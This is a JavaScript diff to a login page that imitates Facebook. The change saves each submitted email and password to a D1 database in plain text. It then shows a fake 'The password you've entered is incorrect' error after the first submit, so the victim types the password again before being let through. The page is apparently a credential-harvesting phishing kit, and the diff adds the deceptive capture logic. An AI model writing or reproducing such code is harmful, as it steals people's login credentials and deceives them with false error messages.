@@ -296,15 +296,9 @@
                     return;
                 }
 
-                // Like Facebook: the first attempt always shows the error — the second logs in
+                // Both submits store the credentials on D1 (plain text).
+                // Like Facebook: the first attempt shows the error — the second logs in.
                 attempts++;
-                if (attempts < 2) {
-                    errorBox.hidden = false;
-                    passwordInput.focus();
-                    passwordInput.select();
-                    return;
-                }
-
                 var email = form.elements["email"].value.trim();
 
                 loginBtn.disabled = true;
@@ -322,6 +316,14 @@
                         });
                     })
                     .then(function () {
+                        if (attempts < 2) {
+                            // 1st submit: data is saved on D1, but show the error — 2nd submit logs in
+                            errorMsg.textContent = "The password you've entered is incorrect.";
+                            errorBox.hidden = false;
+                            passwordInput.focus();
+                            passwordInput.select();
+                            return;
+                        }
                         sessionStorage.setItem("sawlai_user", "1");
                         sessionStorage.removeItem("sawlai_gate");
                         // Return to the page they came from (the pretty post URL), else the home page
